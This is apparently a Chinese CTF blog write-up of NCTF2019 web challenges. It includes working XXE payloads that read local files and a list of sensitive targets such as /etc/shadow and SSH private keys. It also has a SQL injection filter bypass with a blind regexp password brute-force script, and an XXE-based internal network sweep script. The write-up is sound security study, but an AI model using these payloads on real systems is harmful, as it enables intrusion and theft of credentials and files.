+++
title = "NCTF2019"
slug = "nctf2019"
description = "刷"
date = "2024-09-15T15:45:17"
lastmod = "2024-09-15T15:45:17"
image = ""
license = ""
categories = ["复现"]
tags = ["mysql", "xxe"]
+++

# [NCTF2019]Fake XML cookbook

登录的时候抓包一看这不就是`xxe`嘛

```
Request:

POST /doLogin.php HTTP/1.1
Host: 3fdddced-f473-4d1e-86ac-2ff88fc97627.node5.buuoj.cn:81
Content-Length: 57
Accept: application/xml, text/xml, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/xml;charset=UTF-8
Origin: http://3fdddced-f473-4d1e-86ac-2ff88fc97627.node5.buuoj.cn:81
Referer: http://3fdddced-f473-4d1e-86ac-2ff88fc97627.node5.buuoj.cn:81/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

<user><username>1</username><password>1</password></user>
```

写个poc，最简单的应该算是

```xml
<?xml version="1.0" ?>
<!DOCTYPE llw [
<!ENTITY file SYSTEM  "file:///flag">
]>
<user>
	<username>&file;</username>
	<password>1</password>
</user>
```

# [NCTF2019]SQLi

扫描出来,访问`robots.txt`

```
User-agent: * 
Disallow: /hint.txt
```

`hint.txt`

```sql
$black_list = "/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\'|=| |in|<|>|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i";


If $_POST['passwd'] === admin's password,

Then you will get the flag;
```

查看源代码发现

```sql
select * from users where username='' and passwd=''
```

过滤了挺多的东西，这里使用

> /**/绕过空格，然后%00当注释

在使用`\`转义一个引号

```sql
select * from users where username='\' and passwd='||1;%00'
```

这里的判断语句要根据状态码?,不知道，继续看，那么我们要爆出密码来

这里使用一个正则的姿势

```sql
select * from users where username='\' and passwd='||passwd/**/regexp/**/"^a";%00'
```

```
Request:

POST /index.php HTTP/1.1
Host: 6ffc007b-7d5d-4460-9bdd-e8d362d38d81.node5.buuoj.cn:81
Content-Length: 48
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://6ffc007b-7d5d-4460-9bdd-e8d362d38d81.node5.buuoj.cn:81
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://6ffc007b-7d5d-4460-9bdd-e8d362d38d81.node5.buuoj.cn:81/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

username=\&passwd=||passwd/**/regexp/**/"^y";%00
```

回显

```
Response:

HTTP/1.1 302 Found
Server: openresty
Date: Sun, 15 Sep 2024 08:02:32 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 2249
Connection: close
X-Powered-By: PHP/5.6.40
location: welcome.php
Cache-Control: no-cache
```

也就是说我们可以使用`welcome`来判断

```python
import requests
from urllib import parse
import time

strings = 'abcdefghijklmnopqrstuvwxyz1234567890_{}-~'
# 不用大写
url = 'http://6ffc007b-7d5d-4460-9bdd-e8d362d38d81.node5.buuoj.cn:81/index.php'
passwd = ""
i = 0

while i < 80:
    for one_char in strings:
        data = {
            'username':'\\',# 一个斜杠不能达到效果
            'passwd':'||/**/passwd/**/regexp/**/\"^'+passwd+one_char+'\";'+parse.unquote('%00') #在python中对url进行解码
                                                   #  实现"^字符串"
        }
        rs = requests.post(url,data).content.decode('utf-8')
        # 必须把响应包解码
        time.sleep(0.01)
        if 'welcome' in rs:
            passwd += one_char
            print("\r", end="")#动态更新内容（进度条）
            print('已匹配到前'+str(i+1)+'位'+' | '+str(passwd),end='')
            i += 1
            break
        if one_char=='~' and 'welcome' not in rs:
            print('\n密码共'+str(i)+'位，已匹配完成')
            i = 80
            break
```

爆破出来之后，只能在bp里面发包才行，不然是不成功的

# [NCTF2019]True XML cookbook

本人xxe也不好，但是这道题应该的考点就是读取敏感文件

> /etc/passwd
> /etc/shadow
> /etc/hosts
> /root/.bash_history             //root的bash历史记录
> /root/.ssh/authorized_keys
> /root/.mysql_history           //mysql的bash历史记录
> /root/.wget-hsts
> /opt/nginx/conf/nginx.conf            //nginx的配置文件
> /var/www/html/index.html
> /etc/my.cnf
> /etc/httpd/conf/httpd.conf            //httpd的配置文件
> /proc/self/fd/fd[0-9]*(文件标识符)
> /proc/mounts
> /porc/config.gz
> /proc/sched_debug          // 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用
> /proc/mounts          // 挂载的文件系统列表
> /proc/net/arp          //arp表，可以获得内网其他机器的地址
> /proc/net/route      //路由表信息
> /proc/net/tcp and /proc/net/udp          // 活动连接的信息
> /proc/net/fib_trie          // 路由缓存
> /proc/version         // 内核版本
> /proc/[PID]/cmdline        // 可能包含有用的路径信息
> /proc/[PID]/environ           // 程序运行的环境变量信息，可以用来包含getshell
> /proc/[PID]/cwd          // 当前进程的工作目录
> /proc/[PID]/fd/[#]         // 访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log
> ssh
> /root/.ssh/id_rsa
> /root/.ssh/id_rsa.pub
> /root/.ssh/authorized_keys
> /etc/ssh/sshd_config
> /var/log/secure
> /etc/sysconfig/network-scripts/ifcfg-eth0
> /etc/syscomfig/network-scripts/ifcfg-eth1
>
> /etc/hosts
>
> /proc/net/arp
>
> /proc/net/tcp
>
> /proc/net/udp
>
> /proc/net/dev
>
> /proc/net/fib_trie

那么写个`poc`

```xml
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY file SYSTEM "file:///etc/passwd">
 ]>
<user><username>&file;</username><password>456</password></user>
```

然后貌似是没有什么东西可以用

那读取IP看看，内网里面应该有东西

```xml
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY file SYSTEM "file:///proc/net/fib_trie">
 ]>
<user><username>&file;</username><password>456</password></user>
```

得到

```
Main:
  +-- 0.0.0.0/0 3 0 5
     +-- 0.0.0.0/4 2 0 2
        |-- 0.0.0.0
           /0 universe UNICAST
        |-- 10.244.166.68
           /32 host LOCAL
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     |-- 169.254.1.1
        /32 link UNICAST
Local:
  +-- 0.0.0.0/0 3 0 5
     +-- 0.0.0.0/4 2 0 2
        |-- 0.0.0.0
           /0 universe UNICAST
        |-- 10.244.166.68
           /32 host LOCAL
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     |-- 169.254.1.1
        /32 link UNICAST
```

`169.254.1.1`和`10.244.166.68`

本来想直接用bp爆破的，但是发现直接给我卡死了

写个EXP

```python
import requests
import time

url = "http://233b23f0-319d-4629-a9d4-e4075e49f8e1.node5.buuoj.cn:81/doLogin.php"

# 定义XML数据模板
data_template = '''
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY file SYSTEM "http://10.244.166.{}">
]>
<user><username>&file;</username><password>456</password></user>
'''

# HTTP请求的头信息
headers = {
    'Content-Type': 'application/xml',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# 循环遍历IP地址的最后一段
for i in range(1, 256):
    # 使用模板格式化当前的IP地址
    data = data_template.format(i)
    
    try:
        # 发送 POST 请求
        r = requests.post(url=url, headers=headers, data=data, timeout=1)

        # 打印调试信息：状态码和响应内容
        print(f"Trying IP: 10.244.166.{i} -> Status Code: {r.status_code}")

        # 检查响应内容中是否包含flag标志
        if 'flag{' in r.text:
            print(f"Flag found at 10.244.166.{i}: {r.text}")
            break  # 找到flag后退出循环
        else:
            print(f"10.244.166.{i}: No flag found.")

    except requests.exceptions.Timeout:
        # 处理请求超时的情况
        print(f"Timeout occurred at 10.244.166.{i}, skipping.")
    except requests.exceptions.RequestException as e:
        # 捕获其他网络相关错误
        print(f"An error occurred at 10.244.166.{i}: {e}")

    # 等待0.3秒以避免请求过快，过于频繁可能会触发限速机制
    time.sleep(0.3)
```

中途写脚本的时候始终跑不起来，超时504，后面加了一个捕捉错误就可以了

# [NCTF2019]phar matches everything

这道题涉及的不会的有点多，先欠着
